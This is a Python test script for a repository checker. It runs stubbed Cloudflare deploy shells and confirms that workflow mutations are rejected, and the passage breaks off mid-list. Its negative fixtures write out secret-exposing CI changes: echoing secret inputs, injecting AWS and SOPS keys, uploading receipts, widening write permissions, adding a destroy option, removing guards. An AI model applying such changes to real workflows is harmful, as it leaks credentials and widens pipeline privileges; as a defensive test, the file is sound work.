#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import textwrap
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("repository_check", ROOT / "checks/repository.py")
assert SPEC is not None and SPEC.loader is not None
repository = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(repository)


def copy_root() -> Path:
    target = Path(tempfile.mkdtemp(prefix="envs-repository-test-")) / "repo"
    shutil.copytree(ROOT, target, ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git"))
    return target


def expect_red(mutate) -> None:
    root = copy_root()
    try:
        mutate(root)
        try:
            repository.inspect(root)
        except (repository.RepositoryError, ValueError, OSError):
            return
        raise AssertionError("invalid repository state was accepted")
    finally:
        shutil.rmtree(root.parent, ignore_errors=True)


def append_branch_effect(root: Path) -> None:
    path = root / "contracts/provider-consumer.jsonl"
    rows = [json.loads(line) for line in path.read_text().splitlines() if line]
    rows[0]["effect_source_branches"].append("main")
    path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in rows))


def mutate_plane(identity: str, change):
    def mutate(root: Path) -> None:
        path = root / "contracts/environments.jsonl"
        rows = [json.loads(line) for line in path.read_text().splitlines() if line]
        for row in rows:
            if row["id"] == identity:
                change(row)
        path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in rows))

    return mutate


def fresh_rent(root: Path) -> None:
    # The rent planes before their first handoff: no envelope and all three NOT_CONFIGURED. The copy must pass the
    # production inspection first, so a following mutation's refusal is its own and not an inherited state.
    for relative in ("ciphertexts/dev-rent-tunnel.sops.yaml", "ciphertexts/dev-rent-client.sops.yaml"):
        (root / relative).unlink(missing_ok=True)
    for identity in ("dev.rent-tunnel", "dev.rent-client", "dev.rent-root"):
        mutate_plane(identity, lambda row: row.update({"migration_state": "NOT_CONFIGURED",
                                                       "active_github_environment": None}))(root)
    assert repository.inspect(root)["status"] == "PASS"


def replace_text(relative: str, old: str, new: str):
    def mutate(root: Path) -> None:
        path = root / relative
        text = path.read_text(encoding="utf-8")
        assert old in text, f"{relative} fixture anchor missing"
        path.write_text(text.replace(old, new), encoding="utf-8")

    return mutate


def pi_native_versions_fixtures() -> None:
    """Exercise the actual effect shell with synthetic native CLI outcomes, never a provider."""
    if os.name != "posix":
        print("PI_NATIVE_VERSIONS_FIXTURES=SKIP: requires the normal Linux CI shell")
        return
    bash, jq = shutil.which("bash"), shutil.which("jq")
    assert bash and jq, "the deployment runner's native bash and jq are required"
    workflow = (ROOT / ".github/workflows/deploy-pi-worker-preview.yml").read_text()
    step = workflow.split("      - name: Deploy only the screen preview using existing native auth\n", 1)[1]
    script = textwrap.dedent(step.split("        run: |\n", 1)[1].split("\n      - name:", 1)[0])
    # Synthetic scratch is retained only for this ephemeral CI runner's lifetime.
    scratch = Path(tempfile.mkdtemp(prefix="envs-pi-native-fixtures-"))
    tools = scratch / "bin"
    tools.mkdir()
    screen = scratch / "screen"
    screen.mkdir()
    (screen / "wrangler.json").write_text('{"name":"pi-worker-oauth-screen"}\n')
    python = tools / "python3"
    python.write_text("#!" + sys.executable + "\n" + textwrap.dedent('''\
        import os, sys
        if os.environ["PI_FIXTURE_MODE"] == "host-fail" and "uuid.uuid5" in sys.argv[3]:
            print("fixture-private@example.invalid", file=sys.stderr)
            sys.exit(35)
        os.execv(sys.executable, [sys.executable] + sys.argv[1:])
        '''))
    python.chmod(0o700)
    fake = tools / "wrangler"
    fake.write_text("#!" + sys.executable + "\n" + textwrap.dedent('''\
        import json, os, sys
        from pathlib import Path
        mode = os.environ["PI_FIXTURE_MODE"]
        trace = Path(os.environ["PI_FIXTURE_TRACE"])
        prior = [json.loads(line) for line in trace.read_text().splitlines()] if trace.exists() else []
        args = sys.argv[1:]
        assert args[args.index("--name") + 1] == "pi"
        if args[:2] == ["versions", "upload"] or args[:2] == ["versions", "deploy"]:
            assert json.loads(Path(args[args.index("--config") + 1]).read_text())["name"] == "pi-worker-oauth-screen"
        kind = ("post" if any(row["kind"] == "pre" for row in prior) else "pre") if args[:2] == ["deployments", "status"] else args[1]
        with trace.open("a") as output:
            output.write(json.dumps({"kind": kind, "args": args}) + "\\n")
        private = "fixture-private@example.invalid"
        print(private, file=sys.stderr)
        if mode == "api-error" and kind == "deploy":
            print("\\x1b[31mA request to the Cloudflare API (/accounts/" + "a" * 32 + "/workers/scripts/pi/deployments) failed.\\x1b[0m", file=sys.stderr)
            print("Authentication error [code: 10000] Account name: " + private, file=sys.stderr)
            print("A request to the Cloudflare API (/accounts/private-name/workers/scripts/" + private + ") failed.", file=sys.stderr)
        if mode == "pre-fail" and kind == "pre":
            print("A request to the Cloudflare API (/memberships) failed. [code: 10000] " + private, file=sys.stderr)
        old = "00000000-0000-4000-8000-000000000001"
        new = "00000000-0000-4000-8000-000000000002"
        if kind in ("pre", "post"):
            if mode == kind + "-empty":
                pass
            elif mode == kind + "-json":
                print(private)
            else:
                deployed = any(row["kind"] == "deploy" for row in prior) and mode not in ("deploy-fail", "both-fail", "mismatch-id")
                version = new if kind == "post" and deployed else old
                percentage = 50 if mode == "mismatch-traffic" and kind == "post" else 100
                print(json.dumps({"id": "deployment-fixture", "author_email": private, "versions": [{"version_id": version, "percentage": percentage}]}))
            sys.exit(31 if mode == "pre-fail" and kind == "pre" else 34 if mode in ("post-fail", "both-fail") and kind == "post" else 0)
        print(private)
        if kind == "upload":
            record = {"type": "version-upload", "version": 1, "worker_name": "pi", "worker_name_overridden": False, "version_id": new}
            if mode == "invalid-id": record["version_id"] = private
            if mode == "wrong-worker": record["worker_name"] = "other"
            with Path(os.environ["WRANGLER_OUTPUT_FILE_PATH"]).open("a") as output:
                for row in [{"type": "wrangler-session", "command_line_args": [private]}, record] + ([record] if mode == "duplicate-output" else []):
                    output.write(json.dumps(row) + "\\n")
            sys.exit(32 if mode == "upload-fail" else 0)
        assert kind == "deploy" and args[2] == new + "@100%" and "--yes" in args
        sys.exit(33 if mode in ("deploy-fail", "both-fail", "api-error") else 0)
        '''))
    fake.chmod(0o700)
    for mode, expected, kinds in (
        ("success", 0, ["pre", "upload", "deploy", "post"]),
        ("pre-fail", 31, ["pre", "post"]),
        ("pre-json", None, ["pre", "post"]),
        ("pre-empty", None, ["pre", "post"]),
        ("host-fail", 35, ["pre", "post"]),
        ("upload-fail", 32, ["pre", "upload", "post"]),
        ("invalid-id", None, ["pre", "upload", "post"]),
        ("wrong-worker", None, ["pre", "upload", "post"]),
        ("duplicate-output", None, ["pre", "upload", "post"]),
        ("deploy-fail", 33, ["pre", "upload", "deploy", "post"]),
        ("post-fail", 34, ["pre", "upload", "deploy", "post"]),
        ("post-json", None, ["pre", "upload", "deploy", "post"]),
        ("post-empty", None, ["pre", "upload", "deploy", "post"]),
        ("both-fail", 33, ["pre", "upload", "deploy", "post"]),
        ("api-error", 33, ["pre", "upload", "deploy", "post"]),
        ("mismatch-id", None, ["pre", "upload", "deploy", "post"]),
        ("mismatch-traffic", None, ["pre", "upload", "deploy", "post"]),
    ):
        current = scratch / mode
        current.mkdir()
        trace = current / "calls.jsonl"
        result = subprocess.run([bash, "-c", script], capture_output=True, text=True, env={
            "PATH": os.environ["PATH"], "ENVS_EFFECT_BIN": str(tools), "RUNNER_TEMP": str(current),
            "PI_SCREEN_DIR": str(screen), "CLOUDFLARE_ACCOUNT_ID": "synthetic-account",
            "CLOUDFLARE_API_TOKEN": "synthetic-fixture", "PI_FIXTURE_MODE": mode,
            "PI_FIXTURE_TRACE": str(trace),
        })
        assert (result.returncode == expected if expected is not None else result.returncode != 0), mode
        assert [json.loads(line)["kind"] for line in trace.read_text().splitlines()] == kinds, mode
        assert "fixture-private" not in result.stdout + result.stderr, mode
        assert not result.stderr, mode
        diagnostics = [json.loads(line) for line in result.stdout.splitlines() if line.startswith('{"phase":')]
        if mode in ("api-error", "pre-fail"):
            assert diagnostics == [{"phase": "deploy" if mode == "api-error" else "status-before",
                                    "api_paths": ["/accounts/" + "a" * 32 + "/workers/scripts/pi/deployments"] if mode == "api-error" else ["/memberships"],
                                    "codes": [10000]}], mode
            assert ("pi deploy exit=33" if mode == "api-error" else "pi status-before exit=31") in result.stdout
        else:
            assert not diagnostics, mode
        for capture in current.iterdir():
            assert capture.stat().st_mode & 0o077 == 0, (mode, capture.name)
    print("PI_NATIVE_VERSIONS_FIXTURES=PASS: 17 success/failure/privacy/mismatch cases")


def pi_runtime_fixtures() -> None:
    """Execute the actual bounded runtime shell with synthetic CLI/API responses."""
    bash, jq = shutil.which("bash"), shutil.which("jq")
    assert bash and jq
    source = (ROOT / ".github/workflows/deploy-pi-worker-preview.yml").read_text()
    script = textwrap.dedent(source.split(
        "      - name: Apply finite owner runtime migration and existing Jev binding\n", 1)[1].split("        run: |\n", 1)[1])
    scratch = Path(tempfile.mkdtemp(prefix="envs-pi-runtime-fixtures-"))
    tools = scratch / "bin"
    tools.mkdir()
    (tools / "python3").symlink_to(sys.executable)
    program = """#!PYTHON
import json, os, sys
from pathlib import Path
mode = os.environ["PI_RUNTIME_CASE"]
trace = Path(os.environ["PI_RUNTIME_TRACE"])
calls = json.loads(trace.read_text()) if trace.exists() else []
args = sys.argv[1:]
kind = Path(sys.argv[0]).name
old, deployed, final = [f"00000000-0000-4000-8000-{i:012d}" for i in (1,2,3)]
if kind == "wrangler":
    if args[:2] == ["deployments", "status"]: kind = "status"
    elif args[:2] == ["secret", "put"]:
        kind = "secret"
        assert sys.stdin.read() == "fixture-jev-only"
    else:
        assert args[0] == "deploy"
        kind = "deploy"
    calls.append(kind); trace.write_text(json.dumps(calls))
    print("fixture-private@example.invalid", file=sys.stderr)
    if mode == kind + "-fail" or (mode == "readback-unavailable" and kind == "deploy"): sys.exit(31)
    if kind == "deploy":
        config = json.loads(Path(args[args.index("--config")+1]).read_text())
        assert config["vars"]["PI_PROOF_TRANSIENT"] == "true"
        Path(os.environ["WRANGLER_OUTPUT_FILE_PATH"]).write_text(json.dumps({
            "type":"deploy","version":1,"worker_name":"pi","worker_name_overridden":False,"version_id":deployed})+"\\n")
    elif kind == "status":
        version = final if "secret" in calls else old
        if mode == "changed-current" and calls.count("status") >= 3: version = old
        print(json.dumps({"author_email":"fixture-private@example.invalid","versions":[
            {"version_id":version,"percentage":50 if mode=="traffic" else 100}]}))
    sys.exit(0)
url = args[-1]
if url.endswith("/scripts"):
    kind = "latest"
    row = {"id":"pi"}
    if mode in ("latest-known", "latest-current-mismatch"): row["migration_tag"] = "pi-jev-proof-v1"
    if mode == "latest-unknown": row["migration_tag"] = "fixture-private-latest"
    if mode == "latest-type": row["migration_tag"] = None
    result = [] if mode == "latest-missing" else [row]
    if mode == "latest-duplicate": result.append(row)
    if mode == "latest-malformed": result = {}
    if mode == "readback-unavailable" and "deploy" in calls:
        calls.append(kind); trace.write_text(json.dumps(calls))
        print("fixture-private-error",file=sys.stderr); sys.exit(22)
elif url.endswith("/settings"):
    kind = "settings"
    config = Path(os.environ["PI_RUNTIME_DIR"],"wrangler.json")
    vars = json.loads(config.read_text()).get("vars",{})
    if mode == "owner" and "secret" in calls: vars["PI_ACCESS_OWNER_HASH"] = "wrong"
    bindings = [{"type":"plain_text","name":k,"text":v} for k,v in vars.items()]
    if "secret" in calls: bindings += [
        {"type":"secret_text","name":"PI_JEV_PROOF_API_KEY"},
        {"type":"durable_object_namespace","name":"SESSIONS","class_name":"Session","namespace_id":"fixture-namespace"}]
    result = {"bindings":bindings,"observability":{"enabled":False},"author_email":"fixture-private@example.invalid"}
else:
    assert "/scripts/pi/versions/" in url, url
    version = url.rsplit("/",1)[1]
    kind = "version"
    runtime = {}
    if mode == "latest-known" and version == old: runtime["migration_tag"] = "pi-jev-proof-v1"
    if version != old: runtime["migration_tag"] = "pi-jev-proof-v1"
    if mode == "history" and version == old: runtime["migration_tag"] = "unknown"
    result = {"id":version,"resources":{"script_runtime":runtime,"script":{
        "etag":"wrong" if mode=="code" and version==final else ("old" if version==old else "accepted-code")}}}
    if mode == "deployed-mismatch" and version == deployed: result["id"] = old
    if mode == "malformed" and version == old: result = {}
calls.append(kind); trace.write_text(json.dumps(calls))
print(json.dumps({"success":True,"result":result}))
""".replace("#!PYTHON", "#!" + sys.executable)
    for name in ("wrangler", "curl"):
        path = tools / name
        path.write_text(program)
        path.chmod(0o700)
    for mode in ("success", "history", "malformed", "deploy-fail", "secret-fail", "owner", "code", "traffic", "deployed-mismatch", "changed-current", "latest-known", "latest-current-mismatch", "latest-unknown", "latest-type", "latest-missing", "latest-duplicate", "latest-malformed", "readback-unavailable"):
        current = scratch / mode
        current.mkdir()
        runtime = current / "runtime"
        runtime.mkdir()
        (runtime / "wrangler.json").write_text("{}")
        trace = current / "calls.json"
        result = subprocess.run([bash, "-c", script], capture_output=True, text=True, env={
            **os.environ, "PATH":str(tools)+os.pathsep+os.environ["PATH"],
            "ENVS_EFFECT_BIN":str(tools), "RUNNER_TEMP":str(current), "PI_RUNTIME_DIR":str(runtime),
            "CLOUDFLARE_API_TOKEN":"fixture-limited", "CLOUDFLARE_ACCOUNT_ID":"fixture-account",
            "JEV_API_KEY":"fixture-jev-only", "OPS_SHA":"a"*40,
            "PI_RUNTIME_CASE":mode, "PI_RUNTIME_TRACE":str(trace),
        })
        assert (result.returncode == 0) == (mode in ("success","latest-known","latest-current-mismatch")), (mode,result.stdout,result.stderr)
        assert "fixture-private" not in result.stdout + result.stderr, mode
        calls = json.loads(trace.read_text())
        if mode in ("history", "malformed", "traffic", "latest-unknown", "latest-type", "latest-missing", "latest-duplicate", "latest-malformed"): assert "deploy" not in calls, mode
        if mode in ("latest-unknown","latest-type","latest-missing","latest-duplicate","latest-malformed"):
            assert calls == ["settings","status","version","latest"], calls
        if "secret" in calls: assert calls.index("deploy") < calls.index("secret"), mode
        if mode == "deployed-mismatch": assert "deploy" in calls and "secret" not in calls, calls
        if mode == "changed-current": assert "secret" in calls and calls.count("status") >= 3, calls
        if mode in ("latest-known","latest-current-mismatch"):
            assert "deploy" in calls and "secret" in calls and calls.index("latest") < calls.index("deploy"), calls
        if mode == "success":
            assert calls == ["settings","status","version","latest","deploy","version","secret","status","settings","version","status"], calls
            receipt = json.loads(result.stdout)
            assert receipt["version"].endswith("000000000003")
        if mode in ("deploy-fail","secret-fail","readback-unavailable"):
            rows = [json.loads(line) for line in result.stdout.splitlines() if line.startswith("{")]
            observed = next(row for row in rows if row.get("scope") == "FAILED_WRITE_CURRENT_AND_LATEST_OBSERVATIONS_ONLY")
            assert observed["current_migration_tag"] in ("ABSENT","pi-jev-proof-v1"), observed
            assert observed["latest_pi_migration_tag"] == ("UNKNOWN" if mode=="readback-unavailable" else "ABSENT"), observed
            assert calls[-1] == "latest" and calls.count("latest") == 2, calls
    print("PI_RUNTIME_FIXTURES=PASS: 18 migration/ordering/provenance/owner/privacy cases")


def pi_diagnostic_fixtures() -> None:
    """Execute actual two-GET diagnostics; denial is an observation, never a write retry."""
    bash = shutil.which("bash")
    assert bash
    source = (ROOT / ".github/workflows/deploy-pi-worker-preview.yml").read_text()
    script = textwrap.dedent(source.split(
        "      - name: Read-only runtime API capability diagnostics\n", 1)[1].split(
        "      - name: Apply finite owner runtime migration and existing Jev binding\n", 1)[0].split("        run: |\n", 1)[1])
    with tempfile.TemporaryDirectory(prefix="envs-pi-diagnostic-") as scratch:
        tools = Path(scratch) / "bin"
        tools.mkdir()
        (tools / "python3").symlink_to(sys.executable)
        curl = tools / "curl"
        curl.write_text("""#!PYTHON
import json, os, sys
from pathlib import Path
args = sys.argv[1:]
assert args[args.index("--request")+1] == "GET"
assert "--location" not in args and "--retry" not in args
endpoint = args[-1].split("/workers/",1)[1]
assert endpoint in ("services/pi", "scripts")
trace = Path(os.environ["PI_DIAGNOSTIC_TRACE"])
with trace.open("a") as stream: stream.write(endpoint+"\\n")
mode = os.environ["PI_DIAGNOSTIC_CASE"]
if mode == "network" and endpoint == "services/pi": sys.exit(7)
denied = (mode == "service-denied" and endpoint == "services/pi") or (mode == "scripts-denied" and endpoint == "scripts")
value = {"success":not denied,"errors":[{"code":10000,"message":"fixture-private-body"}] if denied else [],
         "result":[{"id":"pi"},{"id":"private-other-worker"}] if endpoint=="scripts" else {"id":"pi","email":"private@example.invalid"}}
body = Path(args[args.index("--output")+1])
if mode == "wrongshape": value["result"] = "fixture-private-body"
body.write_text("fixture-private-body" if mode=="malformed" else json.dumps(value))
print("403" if denied else "200", end="")
""".replace("#!PYTHON", "#!"+sys.executable))
        curl.chmod(0o700)
        for mode in ("success","service-denied","scripts-denied","malformed","wrongshape","network"):
            current = Path(scratch) / mode
            current.mkdir()
            trace = current / "calls"
            result = subprocess.run([bash,"-c",script], capture_output=True,text=True,env={
                **os.environ,"PATH":str(tools)+os.pathsep+os.environ["PATH"],
                "ENVS_EFFECT_BIN":str(tools),"RUNNER_TEMP":str(current),
                "CLOUDFLARE_API_TOKEN":"fixture-private-token","CLOUDFLARE_ACCOUNT_ID":"fixture-account",
                "PI_DIAGNOSTIC_CASE":mode,"PI_DIAGNOSTIC_TRACE":str(trace)})
            assert (result.returncode==0) == (mode=="success"), (mode,result.stdout,result.stderr)
            assert trace.read_text().splitlines() == ["services/pi","scripts"]
            assert not any(secret in result.stdout+result.stderr for secret in
                           ("fixture-private","private-other-worker","private@example.invalid")), mode
            rows = [json.loads(line) for line in result.stdout.splitlines()]
            assert len(rows)==2 and all(row["scope"]=="READ_ONLY_OBSERVATION_NOT_DEPLOYMENT" for row in rows)
            if mode=="success": assert rows[1]["target_pi_present"] is True
            if mode=="service-denied": assert rows[0]["codes"]==[10000] and rows[1]["success"] is True
            if mode=="scripts-denied": assert rows[1]["codes"]==[10000] and rows[0]["success"] is True
            if mode in ("malformed","wrongshape"): assert all(row["success"] is None for row in rows)
            if mode=="network": assert rows[0]["http"]=="000" and rows[1]["success"] is True
    print("PI_READ_ONLY_DIAGNOSTIC_FIXTURES=PASS: 6 capability/denial/schema/network/privacy cases")


def main() -> None:
    baseline = repository.inspect(ROOT)
    assert baseline["status"] == "PASS"
    assert baseline["canonical_branch"] == "proposals"
    assert baseline["retained_compatibility_branch"] == "main"
    pi_diagnostic_fixtures()
    pi_runtime_fixtures()
    pi_native_versions_fixtures()

    # Structural Source checks reject plaintext/duplicate metadata before publication.
    fixture_spec = importlib.util.spec_from_file_location("mail_carrier_fixtures", ROOT / "checks/test_mail_routing_root.py")
    fixture = importlib.util.module_from_spec(fixture_spec)
    fixture_spec.loader.exec_module(fixture)
    carrier = fixture.state_envelope_fixture()
    valid = copy_root()
    try:
        (valid / "ciphertexts/dev-mail-state.sops.json").write_bytes(carrier)
        assert repository.inspect(valid)["status"] == "PASS"
    finally:
        shutil.rmtree(valid.parent, ignore_errors=True)
    for bad in fixture.invalid_state_envelopes(carrier):
        expect_red(lambda root, bad=bad: (root / "ciphertexts/dev-mail-state.sops.json").write_bytes(bad))

    # Manual Mail operations retain actor/source and private-input boundaries.
    manual = ".github/workflows/operate-dev-mail-routing.yml"
    # All source-level triggers are denied except the one manual dispatch.
    # Neither an added scheduled/repository event nor job-level write scope may
    # become a future activation path without an independently reviewed GO.
    expect_red(replace_text(manual, "on:\n  workflow_dispatch:\n",
                            "on:\n  workflow_dispatch:\n  schedule:\n    - cron: '0 4 * * *'\n"))
    expect_red(replace_text(manual, "on:\n  workflow_dispatch:\n",
                            "on:\n  workflow_dispatch:\n  repository_dispatch:\n"))
    expect_red(replace_text(manual, "    runs-on: ubuntu-24.04\n",
                            "    permissions:\n      actions: write\n      contents: read\n    runs-on: ubuntu-24.04\n"))
    expect_red(replace_text(manual, "    runs-on: ubuntu-24.04\n",
                            "    permissions:\n      actions: read\n      contents: read\n    runs-on: ubuntu-24.04\n"))
    expect_red(replace_text(manual, "  contents: read\n\nconcurrency:",
                            "  contents: read\n  id-token: write\n\nconcurrency:"))
    commented = copy_root()
    try:
        replace_text(manual, "on:\n  workflow_dispatch:\n",
                     "on:\n  # harmless explanatory comment\n  workflow_dispatch:\n")(commented)
        replace_text(manual, "permissions:\n  actions: read\n",
                     "permissions:\n  # harmless explanatory comment\n  actions: read\n")(commented)
        assert repository.inspect(commented)["status"] == "PASS"
    finally:
        shutil.rmtree(commented.parent, ignore_errors=True)
    expect_red(replace_text(manual, "github.run_attempt == 1", "github.run_attempt >= 1"))
    expect_red(replace_text(manual, "options: [qualify, preview, apply]", "options: [qualify, preview, apply, destroy]"))
    # The retired recovery, its rent Environment and any dynamic selector never return.
    expect_red(replace_text(manual, "options: [qualify, preview, apply]", "options: [qualify, recover, preview, apply]"))
    expect_red(replace_text(manual, "    environment: dev-projection\n",
                            "    environment: ${{ inputs.operation == 'recover' && 'dev-rent-tunnel' || 'dev-projection' }}\n"))
    expect_red(replace_text(manual, "    environment: dev-projection\n", "    environment: dev-rent-tunnel\n"))
    expect_red(replace_text(manual, "    environment: dev-projection\n", "    environment: dev-authoring\n"))
    expect_red(replace_text(manual, "MAIL_STATE_INPUTS: ${{ secrets.MAIL_STATE_INPUTS }}",
                            "MAIL_STATE_INPUTS: ${{ secrets.SOPS_AGE_KEY }}"))
    expect_red(replace_text(manual, "MAIL_STATE_INPUTS: ${{ secrets.MAIL_STATE_INPUTS }}",
                            "MAIL_STATE_INPUTS: ${{ secrets.RENT_STATE_PASSPHRASE }}"))
    expect_red(replace_text(manual, "if: inputs.operation == 'preview' || inputs.operation == 'apply'",
                            "if: inputs.operation != 'qualify'"))
    expect_red(replace_text("adapters/mail_routing_root.py", 'MAIL_OPERATIONS = ("qualify", "preview", "apply")',
                            'MAIL_OPERATIONS = ("qualify", "recover", "preview", "apply")'))
    expect_red(replace_text(manual,
                            '"$ENVS_EFFECT_BIN/mail-routing-root"',
                            '"$ENVS_EFFECT_BIN/envs-effect"'))
    expect_red(replace_text(manual, "    steps:\n",
                            "    steps:\n      - name: Early mutation\n        run: echo active\n"))
    expect_red(replace_text(manual, "    steps:\n",
                            "    steps:\n      - name: Bad Secret\n        env:\n"
                            "          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n"))
    expect_red(replace_text("adapters/mail_routing_root.py", "return EXIT_INACTIVE", "return 0"))
    expect_red(replace_text("adapters/mail_routing_root.py", "import sys",
                            "import sys\nimport subprocess"))
    expect_red(replace_text("flake.nix",
                            "paths = [ entry contract-projection mail-routing-read mail-routing-root ] ++ packages;",
                            "paths = [ entry contract-projection mail-routing-read ] ++ packages;"))
    expect_red(replace_text(".github/workflows/check.yml",
                            "run: python3 checks/test_mail_routing_root.py", "run: true"))
    expect_red(replace_text(".github/workflows/check.yml",
                            "test \"$code\" -eq 78", "test \"$code\" -eq 0"))

    expect_red(lambda root: (root / "migration").mkdir())
    expect_red(lambda root: (root / "unexpected").mkdir())
    expect_red(lambda root: (root / "adapters/legacy.sh").write_text("exit 0\n"))
    expect_red(lambda root: (root / "adapters/legacy.go").write_text("package legacy\n"))
    expect_red(lambda root: (root / "contracts/provider-consumer.jsonl").unlink())
    caller = ".github/workflows/jev-issue-comment.yml"
    for old, new in (("github.event.issue.number == 52", "github.event.issue.number == 53"),
                     ("roccho-org/ops/.github/workflows", "other/ops/.github/workflows"),
                     ("@9fc663006f1bd0a16dfaff061471a39451878195", "@proposals"),
                     ("    secrets:\n      JEV_API_KEY: ${{ secrets.JEV_API_KEY }}", "    secrets: inherit"),
                     ("      github.event.issue.pull_request == null", "      true")):
        expect_red(replace_text(caller, old, new))
    expect_red(append_branch_effect)
    # S2 selected workflow: removing/reversing the single literal false
    # would admit secrets and possibly the entire old apply/handoff chain.
    selected = ".github/workflows/project-dev-rent-tunnel.yml"
    literal = "if: ${{ false && github.repository == 'roccho-org/envs' && github.ref_name == 'proposals' }}"
    expect_red(replace_text(selected, literal, literal.replace("false", "true")))
    expect_red(replace_text(selected, literal, literal.replace("false && ", "")))
    expect_red(replace_text(selected, literal, literal.replace("roccho-org/envs", "roccho-dev/envs")))
    expect_red(replace_text(selected, "rent-root-inspect'", "rent-root-other'"))
    expect_red(replace_text(selected, "rent-root-inspect'", "rent-root'"))
    # The inspect job: each native caller clause, the accepted SHA, the first attempt and its ordering before the
    # Environment are required, and the job stays repository read-only with exactly its four steps.
    for clause in (" && github.repository_id == '1391871347'", " && github.ref == 'refs/heads/proposals'",
                   " && github.event_name == 'workflow_dispatch'", " && github.sha == inputs.expected_source_sha",
                   " && github.run_attempt == '1'", " && github.actor_id == '40359643'",
                   " && github.triggering_actor == 'roccho-dev'"):
        expect_red(replace_text(selected, clause, ""))
    expect_red(replace_text(selected, "github.run_attempt == '1'", "github.run_attempt >= '1'"))
    expect_red(replace_text(selected, "      expected_source_sha:\n", "      source:\n"))
    expect_red(replace_text(selected, "    environment: dev-projection\n    permissions:\n",
                            "    permissions:\n"))
    expect_red(replace_text(selected, "      actions: read\n      contents: read\n    steps:\n",
                            "      actions: read\n      contents: write\n    steps:\n"))
    expect_red(replace_text(selected, "      actions: read\n      contents: read\n    steps:\n",
                            "      actions: read\n      contents: read\n      pull-requests: write\n    steps:\n"))
    expect_red(replace_text(selected, "    environment: dev-projection\n    permissions:\n",
                            "    environment: dev-projection\n    outputs:\n      receipt: x\n    permissions:\n"))
    expect_red(replace_text(selected, "  inspect:\n", "  inspector:\n"))
    expect_red(replace_text(selected, "- name: Inspect old S3 state/lock and Cloudflare world\n",
                            "- name: Inspect old S3 state/lock and Cloudflare world (copy)\n"))
    # Privacy: nothing of its own may print, export or keep a value; Environment inputs map on the inspect step only.
    inspect_run = "        run: '\"$ENVS_EFFECT_BIN/envs-effect\" --root \"$GITHUB_WORKSPACE\" rent-root-inspect'\n"
    for extra in ("        continue-on-error: true\n      - name: Show inputs\n        run: echo \"$RENT_HOSTNAME\"\n",
                  "      - name: Keep receipt\n        run: '\"$ENVS_EFFECT_BIN/envs-effect\" >> \"$GITHUB_OUTPUT\"'\n",
                  "      - name: Upload receipt\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a\n"):
        expect_red(replace_text(selected, inspect_run, inspect_run + extra))
    toolchain_run = "        run: '\"$ENVS_EFFECT_BIN/envs-effect\" --root \"$GITHUB_WORKSPACE\" toolchain'\n"
    expect_red(replace_text(selected, toolchain_run, "        env:\n          RENT_STATE_KEY: ${{ vars.RENT_STATE_KEY }}\n"
                            + toolchain_run))
    calendar = ".github/workflows/deploy-calendar-pages.yml"
    for old, new in (
        ("github.event.issue.number == 69", "github.event.issue.number == 70"),
        ("github.event.comment.user.id == 40359643", "github.event.comment.user.id == 44"),
        ("github.ref_name == 'proposals'", "github.ref_name == 'main'"),
        ("          repository: roccho-dev/apps", "          repository: other/apps"),
        ("          ref: ${{ steps.select.outputs.app_sha }}", "          ref: proposals"),
        ("          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}", ""),
        ("    environment: dev-projection", "    environment: dev-rent-tunnel"),
        ("    environment: dev-projection", "    environment: dev-rent-access-probe"),
    ):
        expect_red(replace_text(calendar, old, new))

    pi_preview = ".github/workflows/deploy-pi-worker-preview.yml"
    for old, new in (
        ("github.ref == 'refs/heads/proposals'", "github.ref == 'refs/heads/main'"),
        ("github.actor_id == '40359643'", "github.actor_id == '1'"),
        ("github.run_attempt == 1", "github.run_attempt >= 1"),
        ("  contents: read", "  contents: write"),
        ("--name pi", "--name unrelated-worker"),
        ("PI_OAUTH_HOST_ID", "PI_CHATGPT_BOOTSTRAP"),
        ("secrets.PI_CLOUDFLARE_API_TOKEN", "secrets.RENT_CLOUDFLARE_API_TOKEN"),
        ("secrets.PI_CLOUDFLARE_API_TOKEN", "secrets.CLOUDFLARE_API_TOKEN"),
        ("secrets.PI_CLOUDFLARE_API_TOKEN", "vars.PI_CLOUDFLARE_API_TOKEN"),
        ('          CLOUDFLARE_API_TOKEN: ${{ secrets.PI_CLOUDFLARE_API_TOKEN }}',
         '          PI_CLOUDFLARE_API_TOKEN: ${{ secrets.PI_CLOUDFLARE_API_TOKEN }}'),
        ('deployments status --name pi --json > "$RUNNER_TEMP/pi-deployment-before.json"',
         'deployments status --name pi --json'),
        ('set -euo pipefail\n          umask 077', 'set -uo pipefail\n          umask 077'),
        ('2> "$RUNNER_TEMP/pi-status-before.stderr" || operation_exit=$?', ''),
        ('2> "$RUNNER_TEMP/pi-upload.stderr" || operation_exit=$?', ''),
        ('2> "$RUNNER_TEMP/pi-deploy.stderr" || operation_exit=$?', ''),
        ('2> "$RUNNER_TEMP/pi-status-after.stderr" || readback_exit=$?', ''),
        ('2> "$RUNNER_TEMP/pi-host-id.stderr")" || operation_exit=$?', ')"'),
        ('[0-9a-f]{32}/workers/[A-Za-z0-9_/-]+', '.+'),
        ('"api_paths": paths, "codes": codes', '"raw": raw'),
        ('report_api_error deploy "$RUNNER_TEMP/pi-deploy.stdout" "$RUNNER_TEMP/pi-deploy.stderr"', 'cat "$RUNNER_TEMP/pi-deploy.stderr"'),
        ('if [[ "$operation_exit" == 0 ]]; then', 'if true; then'),
        ('select(length == 1)', 'select(length > 0)'),
        ('.worker_name == "pi"', '.worker_name == "other"'),
        ('"$version_id@100%" --yes', '"latest@100%" --yes'),
        ('exit "$operation_exit"', 'exit 0'),
        ('exit "$readback_exit"', 'exit 0'),
        ('.versions[0].version_id == $version_id', 'true'),
        ('.versions[0].percentage == 100', '.versions[0].percentage == 50'),
        ('{id, versions: [.versions[] | {version_id, percentage}]}', '.'),
        ("jq -ce '{id, versions:", "jq -c '{id, versions:"),
        ('--config "$PI_SCREEN_DIR/wrangler.json" --name pi', '--config unsafe.json'),
        ('.merged == true', '.merged == false'),
        ('.base.ref == "proposals"', '.base.ref == "main"'),
